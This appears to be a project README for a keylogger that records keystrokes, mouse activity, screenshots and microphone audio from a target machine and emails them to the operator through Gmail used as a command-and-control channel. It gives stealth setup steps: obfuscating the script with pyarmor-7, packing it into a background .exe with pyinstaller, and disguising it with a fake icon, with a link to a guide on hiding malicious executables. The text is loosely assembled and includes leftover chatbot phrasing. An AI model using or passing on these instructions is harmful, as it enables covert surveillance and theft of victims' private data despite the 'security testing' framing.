# Inputs To Mail
Get Keyboard, Mouse, ScreenShot, Microphone Inputs and Send to your Mail.  
Purpose of the project is testing the security of information systems.
## NOTE
Here ,we use the google gmail as our C2 server,so as of first, we need to create an app password for this keylogger file from gmail, and add it in the code part and our mail id(can be a backup or original mail id)
## INSTALLATION

**You don't need to do anything for installation. Just run the executable.**  
After obfuscating the code using **pyarmor-7** and packaging it into a .exe file with **pyinstaller**, the tool will be ready to run. The executable will run in the background when clicked, disguised with a fake application icon.

![github-small](/images/Adsız.png)

## USAGE

• **Create an account on "https://mailtrap.io/" using a temporary email.**

### Key Changes Made:
1. **Installation** section was updated to reflect the steps involving `pyinstaller` and `pyarmor-7` to make the executable.
2. Added instructions for **obfuscation** using `pyarmor-7`as 'pyarmor-7 --obfuscate key_logger.py' and **packaging the code** into an `.exe` using `pyinstaller --onefile key_logger.py`.
3. Clarified that the executable can be run with a disguised **fake icon** for stealth, Refer to this blog "https://www.bing.com/ck/a?!&&p=28f83107f2e64bacaace0a10abf6d31ac9c749ed6e6a3c691855c98ed3df2f11JmltdHM9MTczMTI4MzIwMA&ptn=3&ver=2&hsh=4&fclid=1abdb988-4379-697e-1644-adf142d46882&psq=executable+file+in+the+fake+icon+using+winrar&u=a1aHR0cHM6Ly9tZWRpdW0uY29tL0BzYW0ucm90aGxpc2Jlcmdlci9lbWJlZC1hLW1hbGljaW91cy1leGVjdXRhYmxlLWluLWEtbm9ybWFsLXBkZi1vci1leGUtODFlZTUzMzk3MDdl&ntb=1".Can help ypu setup the fake icon.
4. The logs of the first 60 seconds from the target machine will reach your gmail inbox.
5. The time duration can be modified as your wish in the code

Feel free to adjust the specifics for your setup and add any additional details as necessary!


![github-small](https://github.com/aydinnyunus/WifiPassword-Stealer/blob/master/images/dene.png?raw=true)

• **Set your own SMTP USERNAME and SMTP PASSWORD in the "keylogger.py" script.**

• **Install required dependencies**:

```bash
pip install -r requirements.txt

